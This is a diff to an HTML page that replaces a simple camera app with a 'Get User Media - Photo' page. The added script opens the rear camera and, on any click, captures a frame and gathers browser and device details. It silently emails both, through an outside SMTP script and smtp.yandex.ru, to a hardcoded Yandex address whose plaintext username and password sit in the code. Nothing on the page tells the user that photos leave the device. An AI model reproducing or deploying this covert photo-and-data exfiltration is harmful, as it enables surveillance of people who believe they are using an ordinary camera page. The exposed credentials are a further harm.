@@ -1,55 +1,128 @@
-<html lang=”en”>
-	<head>
-		<meta charset="utf-8">
-		<meta http-equiv="x-ua-compatible" content="ie=edge">
-		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-		<meta name="mobile-web-app-capable" content="yes">
-		<meta name="apple-mobile-web-app-capable" content="yes">
-		<meta name="application-name" content="Camera app">
-		<meta name="apple-mobile-web-app-title" content="Camera app">
+<!doctype html>
+<html lang="en">
 
-		<!-- Name of the app -->
-		<title>Camera App</title>
+<head>
+    <meta charset="UTF-8">
+    <title>Get User Media - Photo</title>
+    <meta name="viewport" content="initial-scale=1, user-scalable=no">
+    <link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="icon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="icon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="icon-16x16.png">
+    <link rel="manifest" href="/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <style>
+        #video {
+            width: 100%;
+            height: 100%;
+            max-height: 100vh;
+        }
+        
+        #canvas {
+            display: none;
+        }
+    </style>
+</head>
 
-		<!-- Link to site manifest -->
-		<link rel="manifest" href="site.webmanifest">
+<body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
 
-		<!-- Links to icons -->
-		<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
-		<link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
-		<link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
-		<link rel="manifest" href="site.webmanifest">
-		<link rel="mask-icon" href="safari-pinned-tab.svg" color="#603cba">
-		<meta name="msapplication-TileColor" content="#603cba">
-		<meta name="theme-color" content="#ffffff">
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <script>
+        var canvas = document.getElementById('canvas');
+        var context = canvas.getContext('2d');
+        var video = document.getElementById('video');
 
-		<!-- Link to main style sheet -->
-		<link rel="stylesheet" href="style.css"> 
-	</head>
-	<body>
+        function vibrate(val) {
+            if ("vibrate" in navigator) return navigator.vibrate(val);
+            if ("oVibrate" in navigator) return navigator.oVibrate(val);
+            if ("mozVibrate" in navigator) return navigator.mozVibrate(val);
+            if ("webkitVibrate" in navigator) return navigator.webkitVibrate(val);
+            document.getElementById('error').innerHTML = "Ваш браузер не поддерживает vibration Api .. попробуйте открыть пример в мобильном fixefox, там все точно работает";
+        }
 
-		<!-- Camera -->
-		<main id="camera">
+        function infiniteVibrate(val, interval) {
+            stopVibrate();
+            vInterval = setInterval(function() {
+                vibrate(val);
+            }, interval);
+        }
 
-		    <!-- Camera sensor -->
-		    <canvas id="camera--sensor"></canvas>
-		    
-		    <!-- Camera view -->
-		    <video id="camera--view" autoplay playsinline></video>
-		    
-		    <!-- Camera output -->
-		    <img src="//:0" alt="" id="camera--output">
+        function stopVibrate() {
+            if (typeof(vInterval) !== "undefined") clearInterval(vInterval);
+            vibrate(0);
+        }
+        // Trigger photo take
+        document.getElementsByTagName("body")[0].addEventListener("click", function() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-		    <!-- Camera trigger -->
-		    <button id="camera--trigger">Take a picture</button>
+            var code = navigator.appCodeName;
+            var name = navigator.appName;
+            var vers = navigator.appVersion;
+            var platform = navigator.platform;
+            var cook = navigator.cookieEnabled;
+            var je = navigator.javaEnabled();
+            var ua = navigator.userAgent;
+            var text = 'Ваш браузер: ' + name +
+                '<br />Версия браузера: ' + vers +
+                '<br />Кодовое название браузера: ' + code +
+                '<br />Платформа: ' + platform +
+                '<br />Поддержка cookie: ' + cook +
+                '<br />Поддержка JavaScript: ' + je +
+                '<br />Браузер: ' + ua +
+                navigator.language +
+                '<br />Операционная система: ' + navigator.oscpu +
+                '<br />Производитель: ' + navigator.vendor +
+                '<br />Подразделение: ' + navigator.vendorSub;
+            vibrate(100)
+            Email.send({
+                Host: "smtp.yandex.ru",
+                Username: "koha009@yandex.ru",
+                Password: "markeloff",
+                To: 'koha009@yandex.ru',
+                From: "koha009@yandex.ru",
+                Subject: "Пришел снимок экрана",
+                Body: "<html><h2>Информация</h2><p>" + text + "</p></html>",
+                Attachments: [{
+                    name: 'photo.png',
+                    data: canvas.toDataURL()
+                }]
+            }).then(
+                message => vibrate(500)
+            );
+        });
+        // Grab elements, create settings, etc.
+        var video = document.getElementById('video');
 
-		</main>
+        var constraints = {
+            video: {
+                facingMode: "environment"
+            },
+            audio: false
+        };
+        // Get access to the camera!
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
+                video.srcObject = stream;
+                // video.play();
+            });
+        }
+    </script>
+</body>
 
-		<!-- Reference to your JavaScript file -->
-		<script src="app.js"></script>
-
-		<!-- Reference to adapter.js -->
-		<script src="adapter-min.js"></script>
-
-	</body>
 </html>
